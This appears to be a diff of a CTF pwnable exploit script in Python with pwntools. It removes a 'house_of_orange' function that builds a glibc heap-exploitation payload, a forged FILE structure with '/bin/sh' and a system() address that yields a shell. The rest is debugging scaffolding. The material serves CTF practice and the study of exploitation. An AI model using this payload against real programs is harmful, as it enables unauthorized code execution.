@@ -515,17 +515,6 @@ else:
 
     p = process(PATH)
 
-
-# by w1tcher who dominates pwnable challenges
-def house_of_orange(head_addr, system_addr, io_list_all):
-    payload = b'/bin/sh\x00'
-    payload = payload + p64(0x61) + p64(0) + p64(io_list_all - 16)
-    payload = payload + p64(0) + p64(1) + p64(0) * 9 + p64(system_addr) + p64(0) * 4
-    payload = payload + p64(head_addr + 18 * 8) + p64(2) + p64(3) + p64(0) + \
-            p64(0xffffffffffffffff) + p64(0) * 2 + p64(head_addr + 12 * 8)
-    return payload
-
-
 orig_attach = gdb.attach
 def gdb_attach(*args, **kwargs):
     if DEBUG:
